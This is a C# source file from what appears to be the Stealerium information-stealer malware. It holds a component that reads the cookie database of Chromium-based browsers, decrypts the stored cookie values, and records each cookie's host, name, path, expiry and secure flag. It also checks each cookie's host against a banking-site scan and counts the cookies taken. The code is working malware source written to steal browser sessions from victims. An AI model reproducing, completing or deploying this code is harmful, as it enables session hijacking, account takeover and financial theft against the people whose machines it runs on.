using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class Cookies
    {
        /// <summary>
        ///     Get cookies from chromium based browsers
        /// </summary>
        /// <param name="sCookie"></param>
        /// <returns>List with cookies</returns>
        public static List<Cookie> Get(string sCookie)
        {
            var lcCookies = new List<Cookie>();

            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSqLite == null) return lcCookies;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var cCookie = new Cookie
                    {
                        Value = Crypto.EasyDecrypt(sCookie, sSqLite.GetValue(i, 12))
                    };


                    if (cCookie.Value == "")
                        cCookie.Value = sSqLite.GetValue(i, 3);

                    cCookie.HostKey = Crypto.GetUtf8(sSqLite.GetValue(i, 1));
                    cCookie.Name = Crypto.GetUtf8(sSqLite.GetValue(i, 2));
                    cCookie.Path = Crypto.GetUtf8(sSqLite.GetValue(i, 4));
                    cCookie.ExpiresUtc = Crypto.GetUtf8(sSqLite.GetValue(i, 5));
                    cCookie.IsSecure = Crypto.GetUtf8(sSqLite.GetValue(i, 6).ToUpper());

                    // Analyze value
                    Banking.ScanData(cCookie.HostKey);
                    Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect cookies\n" + ex);
            }

            return lcCookies;
        }
    }
}